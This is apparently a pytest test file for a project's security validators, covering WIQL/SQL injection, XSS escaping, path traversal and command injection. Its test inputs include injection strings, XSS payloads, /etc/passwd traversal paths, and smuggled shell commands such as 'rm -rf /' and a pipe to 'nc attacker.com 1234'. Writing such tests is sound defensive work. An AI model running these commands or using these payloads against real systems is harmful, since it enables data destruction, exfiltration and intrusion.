"""
Comprehensive Test Suite for Security Utilities

Tests all validation functions with legitimate inputs, edge cases, and
malicious attack vectors to ensure robust security.

Run with:
    pytest tests/test_security_utils.py -v
"""

import pytest
import os
import sys

# Add parent directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from execution.security_utils import (
    WIQLValidator,
    HTMLSanitizer,
    PathValidator,
    CommandValidator,
    ValidationError,
    safe_html,
    safe_wiql,
)


# ============================================================================
# WIQL Validator Tests
# ============================================================================

class TestWIQLValidator:
    """Tests for WIQL injection prevention"""

    def test_valid_project_names(self):
        """Test that valid project names are accepted"""
        valid_names = [
            "My Project",
            "Access-Legal_v2.0",
            "Project123",
            "Test.Project",
            "A",  # Single character
            "A" * 64,  # Max length
        ]
        for name in valid_names:
            result = WIQLValidator.validate_project_name(name)
            assert result == name

    def test_project_name_injection_with_quotes(self):
        """Test that SQL injection with quotes is blocked"""
        malicious_names = [
            "'; DROP TABLE bugs--",
            "Project' OR '1'='1",
            'Project" OR "1"="1',
            "Project'; DELETE FROM WorkItems--",
        ]
        for name in malicious_names:
            with pytest.raises(ValidationError):  # Just check that it raises ValidationError
                WIQLValidator.validate_project_name(name)

    def test_project_name_injection_with_keywords(self):
        """Test that SQL/WIQL keywords are blocked"""
        malicious_names = [
            "Project OR 1=1",
            "Project AND TRUE",
            "Project UNION SELECT",
            "Project; DROP TABLE",
            "Project /* comment */ OR",
        ]
        for name in malicious_names:
            with pytest.raises(ValidationError):
                WIQLValidator.validate_project_name(name)

    def test_project_name_too_long(self):
        """Test that overly long project names are rejected"""
        with pytest.raises(ValidationError, match="too long"):
            WIQLValidator.validate_project_name("A" * 65)

    def test_project_name_empty(self):
        """Test that empty project names are rejected"""
        with pytest.raises(ValidationError, match="cannot be empty"):
            WIQLValidator.validate_project_name("")

    def test_project_name_invalid_type(self):
        """Test that non-string types are rejected"""
        with pytest.raises(ValidationError, match="must be string"):
            WIQLValidator.validate_project_name(123)

    def test_project_name_special_chars(self):
        """Test that special characters are rejected"""
        invalid_names = [
            "Project@Email",
            "Project#Tag",
            "Project$Money",
            "Project%Percent",
            "Project&Ampersand",
        ]
        for name in invalid_names:
            with pytest.raises(ValidationError, match="Invalid project name"):
                WIQLValidator.validate_project_name(name)

    def test_valid_work_item_types(self):
        """Test that valid work item types are accepted"""
        valid_types = ["Bug", "User Story", "Task", "Epic", "Feature"]
        for work_type in valid_types:
            result = WIQLValidator.validate_work_item_type(work_type)
            assert result == work_type

    def test_invalid_work_item_types(self):
        """Test that invalid work item types are rejected"""
        with pytest.raises(ValidationError, match="Invalid work item type"):
            WIQLValidator.validate_work_item_type("InvalidType")

    def test_valid_states(self):
        """Test that valid states are accepted"""
        valid_states = ["New", "Active", "Resolved", "Closed", "Done"]
        for state in valid_states:
            result = WIQLValidator.validate_state(state)
            assert result == state

    def test_invalid_states(self):
        """Test that invalid states are rejected"""
        with pytest.raises(ValidationError, match="Invalid state"):
            WIQLValidator.validate_state("InvalidState")

    def test_valid_dates(self):
        """Test that valid ISO 8601 dates are accepted"""
        valid_dates = [
            "2026-01-01",
            "2026-12-31",
            "2000-02-29",  # Leap year
        ]
        for date in valid_dates:
            result = WIQLValidator.validate_date_iso8601(date)
            assert result == date

    def test_invalid_date_formats(self):
        """Test that invalid date formats are rejected"""
        invalid_dates = [
            "2026/01/01",  # Wrong separator
            "01-01-2026",  # Wrong order
            "2026-1-1",  # Missing zero padding
            "not-a-date",
            "2026-13-01",  # Invalid month
            "2026-02-30",  # Invalid day
            "2026-00-01",  # Month zero
        ]
        for date in invalid_dates:
            with pytest.raises(ValidationError):
                WIQLValidator.validate_date_iso8601(date)

    def test_build_safe_wiql_basic(self):
        """Test basic WIQL query building"""
        query = WIQLValidator.build_safe_wiql(
            "WHERE [System.TeamProject] = '{project}'",
            project="My Project"
        )
        assert "My Project" in query
        assert "WHERE [System.TeamProject] = 'My Project'" in query

    def test_build_safe_wiql_multiple_params(self):
        """Test WIQL building with multiple parameters"""
        query = WIQLValidator.build_safe_wiql(
            "WHERE [System.TeamProject] = '{project}' AND [System.WorkItemType] = '{work_type}'",
            project="Test Project",
            work_type="Bug"
        )
        assert "Test Project" in query
        assert "Bug" in query

    def test_build_safe_wiql_injection_blocked(self):
        """Test that injection attempts are blocked in WIQL building"""
        with pytest.raises(ValidationError):
            WIQLValidator.build_safe_wiql(
                "WHERE [System.TeamProject] = '{project}'",
                project="'; DROP TABLE--"
            )

    def test_build_safe_wiql_missing_param(self):
        """Test that missing parameters raise error"""
        with pytest.raises(ValidationError, match="Missing required parameter"):
            WIQLValidator.build_safe_wiql(
                "WHERE [System.TeamProject] = '{project}'",
                # Missing 'project' parameter
            )


# ============================================================================
# HTML Sanitizer Tests
# ============================================================================

class TestHTMLSanitizer:
    """Tests for XSS prevention"""

    def test_escape_script_tags(self):
        """Test that <script> tags are escaped"""
        xss = "<script>alert('XSS')</script>"
        result = HTMLSanitizer.escape_html(xss)
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_escape_img_onerror(self):
        """Test that img onerror XSS is escaped"""
        xss = '<img src=x onerror=alert("XSS")>'
        result = HTMLSanitizer.escape_html(xss)
        assert "<img" not in result
        assert "&lt;img" in result

    def test_escape_event_handlers(self):
        """Test that event handlers are escaped"""
        xss = '<div onclick="alert(\'XSS\')">Click</div>'
        result = HTMLSanitizer.escape_html(xss)
        # Tags should be escaped (< and > converted to entities)
        assert "<div" not in result
        assert "&lt;div" in result
        # The escaped version is safe even if "onclick=" string remains

    def test_escape_javascript_protocol(self):
        """Test that javascript: protocol is escaped"""
        xss = '<a href="javascript:alert(\'XSS\')">Click</a>'
        result = HTMLSanitizer.escape_html(xss)
        # Tags should be escaped (< and > converted to entities)
        assert "<a" not in result
        assert "&lt;a" in result
        # The escaped version is safe even if "javascript:" string remains

    def test_escape_svg_onload(self):
        """Test that SVG onload XSS is escaped"""
        xss = '<svg/onload=alert("XSS")>'
        result = HTMLSanitizer.escape_html(xss)
        assert "<svg" not in result
        assert "&lt;svg" in result

    def test_escape_iframe(self):
        """Test that iframe injection is escaped"""
        xss = '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        result = HTMLSanitizer.escape_html(xss)
        assert "<iframe" not in result
        assert "&lt;iframe" in result

    def test_escape_normal_text(self):
        """Test that normal text is preserved"""
        text = "Hello, World!"
        result = HTMLSanitizer.escape_html(text)
        assert result == text

    def test_escape_text_with_ampersand(self):
        """Test that ampersands are escaped"""
        text = "Tom & Jerry"
        result = HTMLSanitizer.escape_html(text)
        assert result == "Tom &amp; Jerry"

    def test_escape_none(self):
        """Test that None values are handled"""
        result = HTMLSanitizer.escape_html(None)
        assert result == ''

    def test_escape_html_attribute(self):
        """Test attribute-specific escaping"""
        text = '<script>alert("XSS")</script>'
        result = HTMLSanitizer.escape_html_attribute(text)
        assert "<script>" not in result

    def test_escape_javascript_string(self):
        """Test JavaScript string escaping"""
        text = "'; alert('XSS'); var x='"
        result = HTMLSanitizer.escape_javascript_string(text)
        assert "\\'" in result
        assert "alert" in result  # Content preserved but escaped

    def test_safe_html_convenience_function(self):
        """Test convenience wrapper function"""
        xss = "<script>alert('XSS')</script>"
        result = safe_html(xss)
        assert "<script>" not in result


# ============================================================================
# Path Validator Tests
# ============================================================================

class TestPathValidator:
    """Tests for path traversal prevention"""

    def test_validate_simple_filename(self):
        """Test that simple filenames are accepted"""
        result = PathValidator.validate_filename("report.html")
        assert result == "report.html"

    def test_validate_filename_with_extension_check(self):
        """Test filename with extension whitelist"""
        result = PathValidator.validate_filename("report.html", ['.html', '.htm'])
        assert result == "report.html"

    def test_reject_invalid_extension(self):
        """Test that invalid extensions are rejected"""
        with pytest.raises(ValidationError, match="Invalid file extension"):
            PathValidator.validate_filename("report.txt", ['.html', '.htm'])

    def test_reject_path_traversal_dotdot(self):
        """Test that ../ is rejected"""
        with pytest.raises(ValidationError, match="path separators"):
            PathValidator.validate_filename("../../etc/passwd")

    def test_reject_absolute_path(self):
        """Test that absolute paths are rejected"""
        with pytest.raises(ValidationError, match="path separators"):
            PathValidator.validate_filename("/etc/passwd")

    def test_reject_windows_path_traversal(self):
        """Test that Windows path traversal is rejected"""
        with pytest.raises(ValidationError, match="path separators"):
            PathValidator.validate_filename("..\\..\\windows\\system32\\config")

    def test_reject_hidden_files(self):
        """Test that hidden files are rejected"""
        with pytest.raises(ValidationError, match="Hidden files"):
            PathValidator.validate_filename(".bashrc")

    def test_reject_empty_filename(self):
        """Test that empty filenames are rejected"""
        with pytest.raises(ValidationError, match="cannot be empty"):
            PathValidator.validate_filename("")

    def test_reject_very_long_filename(self):
        """Test that overly long filenames are rejected"""
        with pytest.raises(ValidationError, match="too long"):
            PathValidator.validate_filename("a" * 300 + ".txt")

    def test_validate_safe_path_within_base(self):
        """Test that paths within base directory are accepted"""
        base_dir = os.path.abspath(".tmp")
        result = PathValidator.validate_safe_path(base_dir, "report.json")
        assert result.startswith(base_dir)

    def test_reject_path_escaping_base(self):
        """Test that paths escaping base directory are rejected"""
        base_dir = os.path.abspath(".tmp")
        with pytest.raises(ValidationError, match="Path traversal detected"):
            PathValidator.validate_safe_path(base_dir, "../../etc/passwd")

    def test_reject_path_with_symlink_escape(self):
        """Test that symlink escapes are prevented"""
        base_dir = os.path.abspath(".tmp")
        # Even if there's a symlink, the path should be validated
        with pytest.raises(ValidationError, match="Path traversal detected"):
            PathValidator.validate_safe_path(base_dir, "../other_dir/file.txt")


# ============================================================================
# Command Validator Tests
# ============================================================================

class TestCommandValidator:
    """Tests for command injection prevention"""

    def test_validate_simple_argument(self):
        """Test that simple arguments are accepted"""
        result = CommandValidator.validate_safe_argument("myfile.txt")
        assert result == "myfile.txt"

    def test_reject_command_chaining_ampersand(self):
        """Test that & command chaining is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: &"):
            CommandValidator.validate_safe_argument("file.txt && rm -rf /")

    def test_reject_command_chaining_pipe(self):
        """Test that | pipe is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: |"):
            CommandValidator.validate_safe_argument("file.txt | nc attacker.com 1234")

    def test_reject_command_chaining_semicolon(self):
        """Test that ; semicolon is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: ;"):
            CommandValidator.validate_safe_argument("file.txt; rm -rf /")

    def test_reject_backtick_execution(self):
        """Test that backtick command execution is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: `"):
            CommandValidator.validate_safe_argument("file_`whoami`.txt")

    def test_reject_dollar_sign_expansion(self):
        """Test that $() command substitution is rejected"""
        with pytest.raises(ValidationError, match=r"dangerous character: \$"):
            CommandValidator.validate_safe_argument("file_$(whoami).txt")

    def test_reject_redirection(self):
        """Test that I/O redirection is rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file.txt > /dev/null")

    def test_reject_very_long_argument(self):
        """Test that overly long arguments are rejected"""
        with pytest.raises(ValidationError, match="too long"):
            CommandValidator.validate_safe_argument("a" * 2000)

    def test_validate_command_path_simple(self):
        """Test that simple command paths are accepted"""
        result = CommandValidator.validate_command_path("python")
        assert result == "python"

    def test_validate_command_path_with_whitelist(self):
        """Test command path with whitelist"""
        result = CommandValidator.validate_command_path(
            "python",
            allowed_commands=['python', 'pip', 'pytest']
        )
        assert result == "python"

    def test_reject_command_not_in_whitelist(self):
        """Test that commands not in whitelist are rejected"""
        with pytest.raises(ValidationError, match="not in whitelist"):
            CommandValidator.validate_command_path(
                "malicious_command",
                allowed_commands=['python', 'pip', 'pytest']
            )

    def test_reject_command_path_traversal(self):
        """Test that path traversal in commands is rejected"""
        with pytest.raises(ValidationError, match="path traversal"):
            CommandValidator.validate_command_path("../../usr/bin/malicious")


# ============================================================================
# Integration Tests
# ============================================================================

class TestIntegration:
    """Integration tests combining multiple validators"""

    def test_wiql_query_end_to_end(self):
        """Test complete WIQL query construction"""
        query = safe_wiql(
            '''SELECT [System.Id], [System.Title], [System.State]
               FROM WorkItems
               WHERE [System.TeamProject] = '{project}'
               AND [System.WorkItemType] = '{work_type}'
               AND [System.CreatedDate] >= '{start_date}'
               ORDER BY [System.Id] ASC''',
            project="Access Legal",
            work_type="Bug",
            start_date="2026-01-01"
        )

        assert "Access Legal" in query
        assert "Bug" in query
        assert "2026-01-01" in query
        # Ensure no injection
        assert "DROP" not in query
        assert "OR 1=1" not in query

    def test_html_dashboard_generation(self):
        """Test HTML generation with user data"""
        bug_title = "<script>alert('XSS')</script>"
        safe_title = safe_html(bug_title)

        html = f"<td>{safe_title}</td>"

        assert "<script>" not in html
        assert "&lt;script&gt;" in html

    def test_file_output_validation(self):
        """Test file path validation for reports"""
        user_filename = "../../etc/passwd"

        with pytest.raises(ValidationError):
            safe_filename = PathValidator.validate_filename(user_filename)

        # Valid filename should work
        safe_filename = PathValidator.validate_filename("report.html")
        assert safe_filename == "report.html"


# ============================================================================
# Run Tests
# ============================================================================

if __name__ == '__main__':
    # Run with pytest
    import subprocess
    result = subprocess.run(['pytest', __file__, '-v'], capture_output=False)
    sys.exit(result.returncode)
